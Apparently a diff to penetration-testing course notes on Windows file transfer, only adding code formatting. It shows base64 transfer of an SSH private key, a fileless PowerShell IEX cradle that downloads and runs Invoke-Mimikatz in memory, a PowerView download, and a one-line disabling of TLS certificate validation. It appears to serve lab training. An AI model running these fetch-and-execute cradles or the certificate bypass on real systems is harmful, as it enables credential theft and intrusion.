@@ -16,10 +16,10 @@ Depending on the file size we want to transfer, we can use different methods tha
 An essential step in using this method is to ensure the file you encode and decode is correct. We can use md5sum, a program that calculates and verifies 128-bit MD5 checksums. The MD5 hash functions as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere. Let's attempt to transfer a sample ssh key. It can be anything else, from our Pwnbox to the Windows target.
 
 - Pwnbox Check SSH Key MD5 Hash: Pwnbox Check SSH Key MD5 Hash
-- Pwnbox Encode SSH Key to Base64: cat id_rsa | base64 -w 0;echo
+- Pwnbox Encode SSH Key to Base64: `cat id_rsa | base64 -w 0;echo`
 
 We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.
-[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("base64")
+`[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("base64")`
 
 Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.
 PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:
@@ -39,25 +39,25 @@ PowerShell offers many file transfer options. In any version of PowerShell, the 
 
 We can specify the class name Net.WebClient and the method DownloadFile with the parameters corresponding to the URL of the target file to download and the output file name.
 
-- (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+- `(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')`
 
-- (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
+- `(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')`
 
 ## PowerShell DownloadString - Fileless Method
 
 As we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.
 
-- IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+- `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
 
 IEX also accepts pipeline input.
 
-- (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+- `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX`
 
 ## PowerShell Invoke-WebRequest
 
 From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.
 
-- Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+- `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`
 
 ## Common Errors with PowerShell
 
@@ -65,5 +65,5 @@ There may be cases when the Internet Explorer first-launch configuration has not
 
 Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
 
-- [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+- `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`
 
